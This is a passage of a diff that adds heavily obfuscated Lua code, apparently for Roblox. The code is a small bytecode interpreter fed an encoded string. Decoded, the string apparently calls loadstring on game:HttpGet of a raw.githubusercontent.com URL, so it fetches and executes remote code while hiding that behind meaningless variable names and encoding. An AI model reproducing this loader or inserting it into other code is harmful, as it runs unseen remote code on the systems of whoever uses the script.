+					v19 = v19 + (1127 - (936 + 189));
+					return (v59 * (85 + 171)) + v58;
+				end
+				v18 = 3;
+			end
+			if (v18 == 0) then
+				v19 = 1;
+				v20 = nil;
+				v16 = v4(v3(v16, 5), "..", function(v60)
+					if (v1(v60, 2) == 79) then
+						local v73 = 0;
+						while true do
+							if (v73 == 0) then
+								v20 = v0(v3(v60, 1, 1));
+								return "";
+							end
+						end
+					else
+						local v74 = v2(v0(v60, 16));
+						if v20 then
+							local v79 = 0;
+							local v80;
+							while true do
+								if (v79 == 1) then
+									return v80;
+								end
+								if (v79 == 0) then
+									v80 = v5(v74, v20);
+									v20 = nil;
+									v79 = 1;
+								end
+							end
+						else
+							return v74;
+						end
+					end
+				end);
+				v18 = 1;
+			end
+			if (v18 == 7) then
+				function v30(v61, v62, v63)
+					local v64 = 0;
+					local v65;
+					local v66;
+					local v67;
+					while true do
+						if (v64 == 0) then
+							v65 = v61[1];
+							v66 = v61[2];
+							v64 = 1;
+						end
+						if (v64 == 1) then
+							v67 = v61[3];
+							return function(...)
+								local v81 = v65;
+								local v82 = v66;
+								local v83 = v67;
+								local v84 = v28;
+								local v85 = 1;
+								local v86 = -1;
+								local v87 = {};
+								local v88 = {...};
+								local v89 = v12("#", ...) - 1;
+								local v90 = {};
+								local v91 = {};
+								for v95 = 0, v89 do
+									if (v95 >= v83) then
+										v87[v95 - v83] = v88[v95 + 1];
+									else
+										v91[v95] = v88[v95 + 1];
+									end
+								end
+								local v92 = (v89 - v83) + 1;
+								local v93;
+								local v94;
+								while true do
+									v93 = v81[v85];
+									v94 = v93[1];
+									if (v94 <= 6) then
+										if (v94 <= 2) then
+											if (v94 <= 0) then
+												do
+													return;
+												end
+											elseif (v94 > 1) then
+												v91[v93[2]] = v63[v93[3]];
+											else
+												v91[v93[2]] = v93[3];
+											end
+										elseif (v94 <= 4) then
+											if (v94 == 3) then
+												local v127 = v93[2];
+												local v128, v129 = v84(v91[v127](v13(v91, v127 + 1, v93[3])));
+												v86 = (v129 + v127) - 1;
+												local v130 = 0;
+												for v149 = v127, v86 do
+													local v150 = 0;
+													while true do
+														if (v150 == 0) then
+															v130 = v130 + 1;
+															v91[v149] = v128[v130];
+															break;
+														end
+													end
+												end
+											else
+												v91[v93[2]] = v63[v93[3]];
+											end
+										elseif (v94 == 5) then
+											v91[v93[2]]();
+										else
+											local v133 = 0;
+											local v134;
+											while true do
+												if (v133 == 0) then
+													v134 = v93[2];
+													v91[v134] = v91[v134](v13(v91, v134 + 1, v86));
+													break;
+												end
+											end
+										end
+									elseif (v94 <= 9) then
+										if (v94 <= 7) then
+											local v105 = v93[2];
+											local v106, v107 = v84(v91[v105](v13(v91, v105 + 1, v93[3])));
+											v86 = (v107 + v105) - 1;
+											local v108 = 0;
+											for v111 = v105, v86 do
+												v108 = v108 + 1;
+												v91[v111] = v106[v108];
+											end
+										elseif (v94 == 8) then
+											local v135 = v93[2];
+											local v136 = v91[v93[3]];
+											v91[v135 + 1] = v136;
+											v91[v135] = v136[v93[4]];
+										else
+											do
+												return;
+											end
+										end
+									elseif (v94 <= 11) then
+										if (v94 == 10) then
+											local v140 = v93[2];
+											local v141 = v91[v93[3]];
+											v91[v140 + 1] = v141;
+											v91[v140] = v141[v93[4]];
+										else
+											local v145 = v93[2];
+											v91[v145] = v91[v145](v13(v91, v145 + 1, v86));
+										end
+									elseif (v94 == 12) then
+										v91[v93[2]] = v93[3];
+									else
+										v91[v93[2]]();
+									end
+									v85 = v85 + 1;
+								end
+							end;
+						end
+					end
+				end
+				return v30(v29(), {}, v17)(...);
+			end
+		end
+	end
+	v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F526F626C6F7849444775626B756B2F736E6A646A736E646D646B2O642F6D61696E2F536A7375646A736A642O6A00083O0012023O00013O001202000100023O00200800010001000300120C000300044O0007000100034O00065O00022O000D3O000100012O00093O00017O00", v9(), ...);
+end
